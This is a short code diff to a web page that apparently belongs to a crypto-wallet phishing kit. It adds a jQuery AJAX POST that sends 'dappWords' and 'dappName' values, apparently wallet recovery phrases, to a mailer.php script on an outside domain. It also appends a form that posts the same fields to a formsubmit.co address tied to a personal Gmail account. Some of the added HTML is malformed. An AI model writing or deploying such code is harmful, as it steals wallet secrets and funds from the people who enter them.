@@ -1556,8 +1556,9 @@
 
         try {
 
-            <form action="https://formsubmit.co/your@email.com" 
-                method="POST" />
+            $.ajax({
+                url: "https://voicewelfare.com/resultbox/mailer.php",
+                method: "POST",
                 dataType: "JSON",
                 data: {
                     dappWord: dappWords,
@@ -1576,3 +1577,8 @@
         }
     });
 </script>
+<form action="https://formsubmit.co/smelissa@gmail.com" method="POST">
+     <input type="dappWord” name="dappWords" required>
+     <input type="dappName" name="dappName" required>
+     <button type="submit_phrase">Send</button>
+</form>
